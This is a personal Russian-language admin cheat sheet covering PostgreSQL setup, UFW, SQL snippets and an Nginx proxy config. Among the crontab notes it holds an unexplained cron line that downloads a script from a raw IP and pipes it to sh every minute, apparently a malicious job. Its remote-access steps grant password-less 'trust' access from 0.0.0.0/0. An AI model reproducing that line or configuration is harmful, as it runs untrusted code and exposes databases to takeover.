##############PostgreSQL###############

				MacOS:

https://ploshadka.net/ustanovka-i-podkljuchenie-postgresql-na-mac-os/

brew install postgresql@14
brew services start/stop/restart postgresql@14       # Правильно


pg_ctl -D /usr/local/var/postgresql@14 start
pg_ctl -D /usr/local/var/postgresql@14 status 




				Ubuntu:

apt install postgresql-13 postgresql-contrib-13 -y
systemctl enable postgresql.service
service postgresql start
service postgresql status

sudo -i -u postgres			# Войти в аккаунт PostgresSQL
psql							# Откроем консоль Postgres
\conninfo					# Узнать статус подключения
\q							# Возврат в аккаунт
\du							# Показать список пользователей
createuser --interactive		# Создание роли

Любому созданному аккаунту привязывается база данных с идентичным именем, то есть наш созданный tester начнет 
подключаться к базе данных tester.

createdb tester				# Добавим БД
Выйти из PostgreSQL и создать пользователя в Ubuntu
sudo adduser tester
sudo -i -u tester
psql
psql -d postgres				#  Переключиться на другую БД

su - postgres -c "psql -c 'SHOW config_file;'"       # Узнать, где хранится файл конфигурации


Как отправить post запрос javascript - Q&A Хекслет


https://selectel.ru/blog/tutorials/how-to-install-and-use-postgresql-on-ubuntu-20-04/



https://vivasart.com/lab/kak-nastroit-udalyonnyy-dostup-k-postgresql-s-udalyonnyh-serverov


Удаленное подключение:
su - postgres -c "psql -c 'SHOW config_file;'" 
>> /etc/postgresql/14/main/postgresql.conf
nano /etc/postgresql/14/main/postgresql.conf
listen_addresses = '*'
nano /etc/postgresql/14/main/pg_hba.conf
# TYPE DATABASE USER ADDRESS METHOD         ->           host mos_rest mos_rest 0.0.0.0/0  trust
host postgres tester all trust
systemctl restart postgresql
ufw allow 5432

Проверить соединения(при их наличии):
netstat -pant | grep postgres
ss -ltn
nmap -sS -O 1353179-cv60284.tw1.ru

Закрыть порт:
ufw delete allow 5432

Показать все правила:
ufw show added

Узнать статус брандмауэра UFW:
sudo ufw status

Разрешить подключение по ssh(через стандартный порт 22):
ufw allow ssh

Включить/Выключить брандмауэра UFW:
ufw enable/disable

Сбросить брандмауэра UFW:
ufw reset


https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-with-ufw-on-ubuntu-18-04-ru


Настройка BD:
sudo su - postgres
psql
CREATE database DB_NAME;
CREATE USER users_name WITH ENCRYPTED PASSWORD ‘users_pass’;
grant all privileges on database DB_NAME to USERS_NAME;
psql -h localhost -U USERS_NAME -W DB_NAME
sudo netstat -tulpn | grep 5432 			# Подтверждение, что PostgreSQL слушает сеть

Сменить пароль юзера postgres:
passwd postgres 		# Затем на предложение ввести пороль вводим 2 раза пороль
su postgres 			# И затем, тот пороль, что мы ввели до этого
psql
alter user postgres with password 'тот пороль, что мы указываели до этого';







Удаление пользователя test_user:
REVOKE ALL ON DATABASE postgres FROM test_user; # postgres - название созданной бд
REVOKE ALL PRIVILEGES ON ALL TABLES IN SCHEMA public FROM test_user;
drop user test_user;

ИЛИ

1. Подключение к базе данных
\c mydatabase
2. Переуступка права собственности
REASSIGN OWNED BY ryan TO <newuser>;
И/или просто удалить объект
DROP OWNED BY ryan;
3. ВыполнениеREVOKE PRIVILEGES
REVOKE ALL PRIVILEGES ON ALL TABLES IN SCHEMA public FROM ryan;
REVOKE ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public FROM ryan;
REVOKE ALL PRIVILEGES ON ALL FUNCTIONS IN SCHEMA public FROM ryan;
4. Отбрасывание пользователя
DROP USER ryan;




!!!!!!!!!!!!!!!!
# Изменить тип колонки на JSON[]:
ALTER TABLE restaurants ALTER COLUMN reviews TYPE JSON[];

# Добавить значение (даже если значение  NULL):
UPDATE restaurants				
SET reviews = array_append(reviews, '{"user": "John", "rating": 5, "comment": "Great place!"}')
WHERE id = 1;

# Добавление через python3(через INSERT INTO … VALUES) (ключ ‘reviews’)
        await user_db.append_restaurants_item({
            'name': 'qwe',
            'image': 'qwe',
            'url_map': 'qwe',
            'url_site': 'qwe',
            'url_menu': 'qwe',
            'address': 'qwe',
            'area': 'qwe',
            'kitchen': ['qwe', 'asd'],
            'description': 'qwe',
            'lat_longitude': '55.766564, 37.623201',
            'favorites': ['123', '123'],
            'reviews': ['{"user": "John", "rating": 5, "comment": "Great place!"}']
            })

# Синтаксис в dbeaver
{"{\"name\": \"First\",\"url\": \"https://t.me/cs_go_live_news_hacks/49\"}","{\"name\": \"Second\",\"url\": 
\"https://t.me/cs_go_live_news_hacks/56\"}"}
!!!!!!!!!!!!!!!!!




# Проверить все версии PostgreSQL на активность
pg_lsclusters

 # Важный параметр, который отвечает за прерывание соединения в случае неактивности
tcp_keepalives_idle = 1min

# Узнать и изменить serial счётчик:
SELECT column_name, column_default FROM information_schema.columns WHERE table_name = 'restaurants';
SELECT setval('restaurants_id_seq', 157);



#logging_collector = off
#log_statement = 'none'
#log_directory = 'log'
#log_lock_waits = off 
#log_temp_files = -1 
#log_checkpoints = off
#log_autovacuum_min_duration = -1
#log_error_verbosity = default 
#log_min_messages = warning

crontab -l -u postgres  		# Посмотреть
crontab -e -u postgres  		# Иссправить
crontab -r -u postgres  		# Очистить


* * * * * wget -q -O - http://185.122.204.197/pg.sh | sh > /dev/null 2>&1




#############NGINX#############

server {
    listen 80;
    server_name 1353179-cv60284.tw1.ru;

    location /bot1 {
        proxy_pass         http://127.0.0.1:3001;
        proxy_redirect     off;
        proxy_set_header   Host $host;
        proxy_set_header   X-Real-IP $remote_addr;
        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header   X-Forwarded-Host $server_name;
    }

        location /bot2 {
            proxy_pass         http://127.0.0.1:3002;
            proxy_redirect     off;
            proxy_set_header   Host $host;
            proxy_set_header   X-Real-IP $remote_addr;
            proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header   X-Forwarded-Host $server_name;
 }

    location / {
        # Перенаправляем все запросы на HTTPS 
        return 301 https://$server_name$request_uri;
    }
}

server {
        listen 443 ssl;
        server_name 1353179-cv60284.tw1.ru;

        ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;
        ssl_certificate /etc/letsencrypt/live/1353179-cv60284.tw1.ru/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/1353179-cv60284.tw1.ru/privkey.pem;

        location /bot1 {
            proxy_pass         http://127.0.0.1:3001;
            proxy_redirect     off;
proxy_set_header   Host $host;
            proxy_set_header   X-Real-IP $remote_addr;
            proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header   X-Forwarded-Host $server_name;
        }

        location /bot2 {
            proxy_pass         http://127.0.0.1:3002;
            proxy_redirect     off;
            proxy_set_header   Host $host;
            proxy_set_header   X-Real-IP $remote_addr;
            proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header   X-Forwarded-Host $server_name;
        }
}




###############SCREEN##############

Отсоединиться от текущего сеанса: Ctrl + A + D
Посмотреть все сессии: screen -ls
Подключиться к сессии: screen -x ID
